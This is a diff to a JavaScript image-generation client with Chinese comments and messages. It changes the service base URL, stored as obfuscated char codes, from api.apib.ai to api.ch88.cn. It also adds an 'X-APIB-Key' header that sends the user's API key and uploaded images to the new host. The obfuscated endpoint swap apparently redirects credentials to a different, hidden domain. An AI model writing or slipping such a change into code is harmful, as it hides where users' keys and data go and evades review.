@@ -2092,7 +2092,7 @@ const POLL_QUERY_ERROR_CODE = 'POLL_QUERY_ERROR';
 const POLL_INTERVAL_MS = 2500;
 const INITIAL_POLL_MAX_ATTEMPTS = 480;   // 约 20 分钟
 const CONTINUE_POLL_MAX_ATTEMPTS = 480;  // 每次继续轮询再追加约 20 分钟
-const SERVICE_BASE = decodeRuntimeText([104,116,116,112,115,58,47,47,97,112,105,46,97,112,105,98,46,97,105]);
+const SERVICE_BASE = decodeRuntimeText([104,116,116,112,115,58,47,47,97,112,105,46,99,104,56,56,46,99,110]);
 const IMAGE_MODEL = decodeRuntimeText([103,112,116,45,105,109,97,103,101,45,50]);
 
 function decodeRuntimeText(codes) {
@@ -2101,6 +2101,10 @@ function decodeRuntimeText(codes) {
 
 function serviceUrl(path) {
   return `${SERVICE_BASE}${path}`;
+}
+
+function authHeaders(key, extra = {}) {
+  return { 'X-APIB-Key': key, ...extra };
 }
 
 function formatPollWindow(maxAttempts) {
@@ -2127,7 +2131,7 @@ async function uploadOneReferenceImage(file, index, total) {
   fd.append('file', file);
   const res = await requestWithChineseError(serviceUrl('/v1/uploads/images'), {
     method: 'POST',
-    headers: { Authorization: `Bearer ${key}` },
+    headers: authHeaders(key),
     body: fd,
   }, '上传图片失败');
   const data = await readJsonResponse(res, '上传图片失败');
@@ -2169,7 +2173,7 @@ async function submitOne(imageUrls, prompt) {
 
   const res = await requestWithChineseError(serviceUrl('/v1/images/generations'), {
     method: 'POST',
-    headers: { Authorization: `Bearer ${key}`, 'Content-Type': 'application/json' },
+    headers: authHeaders(key, { 'Content-Type': 'application/json' }),
     body: JSON.stringify(body),
   }, '提交生成任务失败');
   const data = await readJsonResponse(res, '提交生成任务失败');
@@ -2181,7 +2185,7 @@ async function submitOne(imageUrls, prompt) {
 async function queryTaskStatus(taskId) {
   const key = apiKey.value.trim();
   const res = await requestWithChineseError(serviceUrl(`/v1/tasks/${taskId}?language=zh`), {
-    headers: { Authorization: `Bearer ${key}` },
+    headers: authHeaders(key),
   }, '查询生成进度失败');
   const data = await readJsonResponse(res, '查询生成进度失败');
   if (data.code !== 200 || !data.data) throw new Error('查询生成进度失败：接口未返回有效任务数据');
